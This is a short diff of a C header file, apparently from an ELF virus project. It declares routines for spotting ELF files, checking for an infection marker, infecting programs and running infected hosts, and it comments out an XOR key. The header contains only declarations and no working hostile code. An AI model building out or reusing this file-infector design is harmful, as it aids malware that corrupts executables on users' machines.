@@ -10,17 +10,17 @@
 
 #define __MAGIC (const unsigned char[]) {0x7F, 'E', 'L', 'F'}
 #define __INFECTION_MARK (const unsigned char[]) {'^', 'F', 'K', 'D', '^'}
-#define __XOR_KEY "SomeXORKey"
+// #define __XOR_KEY "SomeXORKey"
 
 typedef unsigned char byte;
 
-bool is_elf(char*);
-bool is_infected(char*);
-byte* read_file(char*);
-char* xor_enc_dec(const char*);
-unsigned int file_size(char*);
+bool is_elf(const char*);
+bool is_infected(const char*);
+byte* read_file(const char*);
+unsigned int file_size(const char*);
 
+void run_executable_file(const char*);
+byte* get_execution_instructions(const char*);
 void infect_program(const char*, const char*);
-void run_infected_host(const char*, const char*);
 
 #endif
